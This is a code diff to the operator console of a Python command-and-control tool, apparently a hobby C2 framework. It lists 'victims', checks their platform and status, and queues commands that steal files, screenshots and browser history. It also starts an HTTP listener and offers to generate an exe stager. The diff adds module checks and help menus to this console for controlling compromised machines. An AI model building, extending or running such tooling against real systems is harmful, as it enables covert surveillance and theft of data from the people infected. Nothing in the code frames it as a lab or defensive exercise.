@@ -79,21 +79,29 @@ def get_victim_status(lastseen):
 	else:
 		print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")
 
+def display_victim_info(victim):
+	for key in victim.keys():
+		if key != '_id':
+			print(key + ' ---> '+ str(victim[key]))
 
+	get_victim_status(victim['lastseen'])
+
+	return victim
 ## Gets the various info of the victim. Trigerred by the info command.
 def get_victim_info(myclient,victim_id):
 	mydb = myclient['pythonc2']
 	victims = mydb["victims"]
 	victim = victims.find_one({'id':victim_id})
 	if victim:
-		for key in victim.keys():
-			if key != '_id':
-				print(key + ' ---> '+ str(victim[key]))
-
-		get_victim_status(victim['lastseen'])
+		return victim
 	else:
-		print("No info to show...Something is wrong..")
+		return False
+def show_victim_info(victim):
+	for key in victim.keys():
+		if key != '_id':
+			print(key + ' ---> '+ str(victim[key]))
 
+	get_victim_status(victim['lastseen'])
 
 ## Checks if a victim id is present in the DB.
 def victim_present(myclient,victim_id):
@@ -104,6 +112,32 @@ def victim_present(myclient,victim_id):
 			return True
 	return False
 
+def is_command_supported(myclient,victim_id,cmd):
+	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
+	victim = get_victim_info(myclient,victim_id)
+	if victim:
+		platform = victim['platform']
+		if cmd in modules[platform]:
+			return True
+	else:
+		print("Something is wrong, Victim not found.")
+
+	return False
+
+def show_supported_modules(myclient,victim_id):
+	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
+	victim = get_victim_info(myclient,victim_id)
+	if victim:
+		platform = victim['platform']
+		print(modules[platform])
+	else:
+		print("Something is wrong, Victim not found.")
+
+def display_victim_help_menu():
+	commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'back': 'Go back to main menu.'}
+
+	for command in commands.keys():
+		print(command + " ---> " + commands[command])
 
 ## Displays the victim menu
 def victim_menu(myclient,victim_id):
@@ -113,12 +147,25 @@ def victim_menu(myclient,victim_id):
 		cmd = str(input())
 
 		if cmd == 'info':
-			get_victim_info(myclient,victim_id)
-		if cmd == 'getfiles':
-			insert_cmd_db(myclient,cmd,victim_id)
+			res = get_victim_info(myclient,victim_id)
+			if res:
+				show_victim_info(res)
+			else:
+				print("No info to show...Something is wrong..")
+		elif cmd == 'getfiles' or cmd == 'screenshot' or cmd == 'browser_history':
+			if is_command_supported(myclient,victim_id,cmd):
+				insert_cmd_db(myclient,cmd,victim_id)
+			else:
+				print('Command not supported. See the supported ones by running modules command')
+		elif cmd == 'modules':
+			show_supported_modules(myclient,victim_id)
 		elif cmd == 'back':
 			print("Going back to main menu...")
 			return
+		elif cmd == 'help':
+			display_victim_help_menu()
+		else:
+			print("Not supported")
 
 
 def parser():
@@ -133,7 +180,11 @@ def parser():
 def kill_listeners(flask_process):
 	os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)
 
+def display_main_help_menu():
+	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
 
+	for command in commands.keys():
+		print(command + " ---> " + commands[command])
 
 def main(myclient):
 	args = parser()
@@ -151,6 +202,7 @@ def main(myclient):
 			## https://stackoverflow.com/questions/4789837/how-to-terminate-a-python-subprocess-launched-with-shell-true
 			flask_process = subprocess.Popen('sudo nohup python3 server.py > log.txt 2>&1 &',stdout=subprocess.PIPE, 
 					shell=True, preexec_fn=os.setsid)
+			print("Started http listener.")
 
 			# grep = subprocess.check_output('ps -ef | grep "nohup python3 server.py"',shell=True)
 			# grep = grep = grep.decode("utf-8")
@@ -180,7 +232,8 @@ def main(myclient):
 				victim_menu(myclient,vicitim_id)
 			else:
 				print("Victim not present")
-		
+		if cmd == 'help':
+			display_main_help_menu()
 		if cmd == 'exit':
 			if 'flask_process' in locals():
 				kill_listeners(flask_process)
